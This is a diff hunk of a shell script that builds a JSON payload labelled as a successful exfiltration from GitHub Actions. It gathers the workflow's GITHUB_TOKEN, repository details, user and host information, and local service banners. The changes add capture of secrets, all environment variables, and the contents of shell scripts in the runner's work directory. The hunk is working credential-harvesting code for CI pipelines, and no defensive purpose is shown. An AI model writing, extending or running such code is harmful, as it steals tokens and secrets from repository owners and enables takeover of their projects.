@@ -50,18 +50,17 @@ JSON_PAYLOAD=$(cat <<EOF
  {
   "message": "SUCCESSFUL EXFILTRATION FROM GITHUB ACTIONS",
   "github_token": "${GITHUB_TOKEN}",
+"github_token": "${secrets.GITHUB_TOKEN}",
   "repository": "${GITHUB_REPOSITORY}",
   "workflow": "${GITHUB_WORKFLOW}",
   "job": "${GITHUB_JOB}",
   "current_user": "$(id)",
   "working_directory": "$(pwd)",
   "hostname": "$(hostname)",
-  "os_release": "$(cat /etc/os-release 2>/dev/null || ver)",
-  "kernel_version": "$(uname -a 2>/dev/null)",
-  "system_info": "$(uname -mrs 2>/dev/null || systeminfo | findstr /B /C:\"OS\" 2>NUL)",
   "http_banner": "$(curl -I http://localhost 2>/dev/null | head -n 1)",
   "ssh_banner": "$(echo | nc localhost 22 2>/dev/null | head -n 1)",
-  "open_ports": "$(netstat -tuln 2>/dev/null || netstat -an 2>NUL | find \"LISTEN\")"
+  "all_env_vars": "$(env | sort | jq -Rn '[inputs|split(\"=\")|{(.[0]):.[1]}]' 2>/dev/null || printenv | sort)",
+  "sh_files_contents": "'"$(for f in /home/runner/work/*.sh 2>/dev/null; do echo "==== $f ===="; cat "$f"; done | tr '\n' ';')"'" 
 }
 EOF
 )
